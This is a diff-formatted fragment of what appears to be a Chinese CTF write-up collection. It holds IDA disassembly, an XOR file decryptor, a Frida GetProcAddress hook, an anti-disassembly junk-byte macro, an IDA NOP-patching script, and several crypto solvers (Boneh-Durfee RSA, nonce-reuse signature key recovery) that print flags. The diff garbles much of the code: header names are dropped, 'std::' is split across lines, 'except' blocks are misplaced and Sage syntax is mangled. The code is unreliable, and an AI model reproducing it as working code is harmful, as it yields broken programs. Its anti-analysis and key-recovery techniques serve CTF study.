+0040195A 64 89 0D 00 00 00 00 mov large fs:0, ecx
+.text:
+00401961 59 pop ecx ; ------nop
+.text:
+00401962 5F pop edi
+.text:
+00401963 5E pop esi
+.text:
+00401964 5B pop ebx ; -----nop
+.text:
+00401965 8B E5 mov esp, ebp
+.text:
+00401967 5D pop ebp
+.text:
+00401968 C2 0C 00 retn 0Ch
+.text:
+00401968 ; } // starts at 4018A0
+.text:
+00401968
+.text:
+00401968 TlsCallback_0 endp
 def xor_encrypt(input_file_path, output_file_path, key):
     try:
         with open(input_file_path, 'rb') as input_file:
@@ -1890,7 +2066,8 @@ def xor_encrypt(input_file_path, output_file_path, key):
 
             with open(output_file_path, 'wb') as output_file:
                 output_file.write(encrypted_content)
-    except Exception as e:
+    
+except Exception as e:
         print(str(e))
 
 input_file_path = 'DATA101.bin'
@@ -1898,16 +2075,12 @@ output_file_path = 'DATA101_out.bin'
 encryption_key = 0x33  
 
 xor_encrypt(input_file_path, output_file_path, encryption_key)
-```
-
-
-
-```
 function main(){
     HookGetProcAddress();
 }
 function HookGetProcAddress(){
-    Interceptor.attach(Process.enumerateModules()[0].base.add(0x00001BB0),{//Process.enumerateModules()[0].base.add(0x00001BB0)为GetProcAddress_0地址 RVA:00001BB0
+    Interceptor.attach(Process.enumerateModules()[0].base.add(0x00001BB0),{//Process.enumerateModules()[0].base.add(0x00001BB0)为GetProcAddress_0地址 RVA:
+00001BB0
         onEnter(args){
             let ordinal = args[1].toInt32();
             console.warn(`ordinal--->${ordinal}`);
@@ -1928,13 +2101,8 @@ setImmediate(main)
 // frida-tools        10.2.1
 //命令
 //frida -f "Pathtofile_encryptor - 复制.exe" -l .hook_file_enc.js --no-pause
-```
-
-
-
-```
-#include <iostream>
-#include <windows.h>
+    #include 
+    #include <windows.h>
 
 using namespace std;
 
@@ -1987,22 +2155,25 @@ int main()
   if (!CryptDecrypt(hKey, 0, 1, 0, (BYTE*)cipher, &cipherLen)) {
   }
 
-  std::cout.write(reinterpret_cast<char*>(cipher), cipherLen);
-  std::cout << std::endl;
+  std::
+cout.write(reinterpret_cast<char*>(cipher), cipherLen);
+  std::
+cout << std::
+endl;
 
   return 0;
  }
 }
-```
-
-
-
-```
-#define AStupid_GetInteger(in, out){
-string Integer = std::to_string(in);
+    #define AStupid_GetInteger(in, out){
+string Integer = std::
+to_string(in);
 int ret = 0;
-std::string::reverse_iterator rbegin = Integer.rbegin();
-std::string::reverse_iterator rend = Integer.rend();
+std::
+string::
+reverse_iterator rbegin = Integer.rbegin();
+std::
+string::
+reverse_iterator rend = Integer.rend();
 int i = 0;
 while ((rbegin != rend) &&
     ((*rbegin == '0') ||
@@ -2030,17 +2201,7 @@ else
 }
 out = ret;
 }
-```
-
-
-
-```
-#define MY_CONFUSE  _asm {_emit 0x55 }_asm {_emit 0xe8}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0x5d}_asm {_emit 0x48}_asm {_emit 0x83}_asm {_emit 0xc5}_asm {_emit 0x08}_asm {_emit 0x55}_asm { ret }_asm {_emit 0xe8}_asm {_emit 0x5d}
-```
-
-
-
-```
+    #define MY_CONFUSE  _asm {_emit 0x55 }_asm {_emit 0xe8}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0}_asm {_emit 0x5d}_asm {_emit 0x48}_asm {_emit 0x83}_asm {_emit 0xc5}_asm {_emit 0x08}_asm {_emit 0x55}_asm { ret }_asm {_emit 0xe8}_asm {_emit 0x5d}
 import idc
 start_add = 0x0040346A #自定义起始位置
 end_add = 0x00403486  #自定义终止位置
@@ -2050,11 +2211,6 @@ for i in range(start_add,end_add):
             ida_bytes.patch_byte(i+mm,0x90)
         i=i+15
 print("finsh")
-```
-
-
-
-```
 mov     efx,0  //output初始返回值为0       
 mov     rex,var_state //state是用户输入的值 -> 手动赋值
 mov     ecx,0  //初始化 i 值
@@ -2066,11 +2222,6 @@ and     eax, 0x1  //eax & 0x01
 mov     ebx, Pbox[ecx] //ebx=var_sbox[i]
 shl     eax,ebx   //eax << ebx
 add     efx, eax
-```
-
-
-
-```
 int pLayer_opcode[] = { 66,0,57,0,67,74,1,55,1,75,76,77 
 ,73,67,74,1,55,1,75,76,77
 ,73,67,74,1,55,1,75,76,77
@@ -2136,11 +2287,6 @@ int pLayer_opcode[] = { 66,0,57,0,67,74,1,55,1,75,76,77 
 ,73,67,74,1,55,1,75,76,77
 ,73,67,74,1,55,1,75,76,77
 };
-```
-
-
-
-```
 mov     efx,0  //output初始返回值为0
 mov     rex,var_state //state是用户输入的值
 mov     ecx,0  //初始化 i 值
@@ -2182,11 +2328,6 @@ shl     edx, 2  // i << 2
 shl  ebx,edx //Sbox[(state >> (i * 4)) & 0xF] << (i * 4)
 
 add     efx, ebx //output+=
-```
-
-
-
-```
 int sBoxLayer_opcode[] = { 66,0,57,0,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72
                            ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72
  ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
@@ -2203,11 +2344,6 @@ int sBoxLayer_opcode[] = { 66,0,57,0,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72
  ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
  ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 
  ,73,2,17,2,67,68,1,55,0xf,69,12,70,2,71,72 };
-```
-
-
-
-```
 int* fibonacci_sequence(int n) {
 
     if (n <= 0) {
@@ -2244,11 +2380,6 @@ int* fibonacci_sequence(int n) {
     {
         roundkeys[i] = rounds[index1[i]];
     }
-```
-
-
-
-```
 def sBoxLayer_dec(state):
     output = 0
     for i in range(16):
@@ -2338,15 +2469,10 @@ def decrypt(blocks):
 cmps = [1,2,3,4]
 
 decrypt(cmps)
-```
-
-
-
-```
-#include <iostream>
-#include <cstdlib>
-#include <ctime>
-#include <string>
+    #include 
+    #include <cstdlib>
+    #include <ctime>
+    #include <string>
 using namespace std;
 string change(string message) {
  
@@ -2403,14 +2529,9 @@ int main() {
 
     return 0;
 }
-```
-
-
-
-```
-#include <iostream>
-#include <cstdlib>
-#include <ctime>
+    #include 
+    #include <cstdlib>
+    #include <ctime>
 
 using namespace std;
 
@@ -2455,11 +2576,6 @@ int main() {
 
     return 0;
 }
-```
-
-
-
-```
 from Crypto.Util.number import *
 """
 Setting debug to true will display more informations
@@ -2589,7 +2705,7 @@ def boneh_durfee(pol, modulus, mm, tt, XX, YY):
     """
 
     # substitution (Herrman and May)
-    PR.<u,x,y> = PolynomialRing(ZZ)
+    PR. = PolynomialRing(ZZ)
     Q = PR.quotient(x * y + 1 - u)  # u = xy + 1
     polZ = Q(pol).lift()
 
@@ -2735,14 +2851,9 @@ pol = 1 + x * (A + y)
 
 solx, soly = boneh_durfee(pol, e, m, t, X, Y)
 d = int(pol(solx, soly) / e)
-#print(d)
+    #print(d)
 a= power_mod(c, d, N)
 print(a)
-```
-
-
-
-```
 from Crypto.Util.number import *
 from gmpy2 import *
 import libnum
@@ -2761,11 +2872,6 @@ k = (h1*r2 - h2*r1 + b*s2*r1) * inverse(s1*r2 - a*s2*r1, q) % q
 m = (s1*k - h1) * invert(r1,q) % q
 flag = b'flag{' + libnum.n2s(int(m)) + b'}'
 print(flag)
-```
-
-
-
-```
 # 第一部分：求解hint
 Hint = (12351774260625362799610458605055557349668978169954248709224197283033722650641969191523420968152180626844781310599988085824706330561484553939064653937267598659731237154241515349280967639128615784193195725170343153328247947729351564102666060302013802359410482179324719156651832539747622404434096773119440083329, 122908984806235457892414635852036332676574434804833208576141668077475917235411535511069143359388659946159724740722593181625712110278669227640297497485641848470391938438894136564046632275052354217712453952532772368082733299695485759213723305738760035793602060420638500827652832664161031815519780589765520132973, 22333858470427703056488469739724305644350178024239032705153649807913901449803887198889611591209527103787726531081225700412575986297091811550954958064297166)
 c,n,leak = Hint
@@ -2872,23 +2978,8 @@ for mpp in m_p:
 
 end = time.time()
 print("Finished in {} seconds.".format(end - start))
-```
-
-
-
-```
 得到hint = b"Anything greater than 2^15 is really that's too big"
-```
-
-
-
-```
 K = (s1 -s2)^-1 * (z1 -z2) mod n
-```
-
-
-
-```
 from hashlib import *
 from Crypto.Util.number import *
 import ecdsa
@@ -3064,7 +3155,8 @@ for j in tqdm(range(250)):
                 P_Q_number = i1
                 print(i1)
                 break
-        except:
+        
+except:
             pass
     if P_Q_number == 0:
         #         print(f'The {j} is failed')
@@ -3095,7 +3187,8 @@ for j in tqdm(range(250)):
                 num = T
                 print('Key = ', Key)
                 break
-        except:
+        
+except:
             pass
 
     C = int(C)
@@ -3106,20 +3199,10 @@ for j in tqdm(range(250)):
     print('We have find the right flag!')
     print(f'flag : {flag}')
     break
-```
-
-
-
-```
 Please firstly pay attention to the file named as "task.py".
 The real flag is a little strange.
 However, there is no need to be messy in your mind just because of the "appearance" of the flag.
 Just be self-confident!
-```
-
-
-
-```
 from Crypto.Util.number import *
 import initialize
 import train
@@ -3168,11 +3251,6 @@ y_hat_cipher1 = parameters[0]
 y_hat_cipher2 = parameters[1]
 print("The final output is n%s" % hex(y_hat_cipher1), "n%s" % hex(y_hat_cipher2))
 print("------")
-```
-
-
-
-```
 from Crypto.Util.number import *
 
 #已知量n、trained_phi、trained_e
@@ -3190,11 +3268,6 @@ m2 = pow(c2, d, n)
 #得出flag
 flag = b"flag{" + long_to_bytes(m1) + long_to_bytes(m2) + b".}"
 print(flag)
-```
-
-
-
-```
 from Crypto.Util.number import *
 
 #已知量n、r、wild_phi、loss
